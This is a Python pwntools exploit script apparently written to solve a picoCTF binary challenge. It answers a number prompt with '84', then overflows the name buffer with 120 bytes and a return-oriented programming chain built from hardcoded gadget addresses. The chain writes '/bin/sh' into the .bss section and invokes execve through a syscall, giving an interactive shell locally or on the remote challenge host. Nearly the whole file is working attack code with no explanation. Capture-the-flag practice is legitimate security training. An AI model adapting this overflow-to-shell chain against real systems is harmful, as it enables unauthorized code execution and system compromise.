#!/usr/bin/env python3
from pwn import *

# Setup
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

BINARY = './vuln'
HOST = 'shape-facility.picoctf.net'
PORT = 53229

# very cool gadgets
#pops from ROPgadget --binary vuln | grep ': pop r[ads][ix] ; ret$'
#syscall from ROPgadget --binary vuln | grep ': syscall$'

POP_RDI = 0x4006a6
POP_RSI = 0x0410b93
POP_RDX = 0x410602
POP_RAX = 0x4005af
SYSCALL = 0x40138c

MOV_QWORD_PTR_RDX_RAX = 0x419027
BSS = 0x6bc3a0

def get_connection(mode):
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Use 'local' or 'remote'")
        exit(1)

def exploit(conn):
    conn = conn
        
    conn.recvuntil(b'What number would you like to guess?\n')
    conn.sendline(b"84")
    
    payload = b"A" * 120

    payload += p64(POP_RDX) + p64(BSS)      # rdx = .bss
    payload += p64(POP_RAX) + b"/bin/sh\0"  # rax = /bin/sh
    payload += p64(MOV_QWORD_PTR_RDX_RAX)   # /bin/sh into rdx
    payload += p64(POP_RAX) + p64(0x3b)     # execve reg start
    payload += p64(POP_RDI)                 # $rdi = .bss (pointer to "/bin/sh")
    payload += p64(BSS)
    payload += p64(POP_RSI)                 # $rsi = 0
    payload += p64(0)
    payload += p64(POP_RDX)                 # $rdx = 0
    payload += p64(0)
    payload += p64(SYSCALL)

    conn.sendlineafter(b"Name?", payload)
    conn.recvline()
    conn.recvline()

    conn.interactive()

def main():
    import sys
    if len(sys.argv) != 2:
        log.error("Usage: python3 exploit.py [local|remote]")
        exit(1)

    conn = get_connection(sys.argv[1])
    exploit(conn)
    conn.close()

if __name__ == "__main__":
    main()
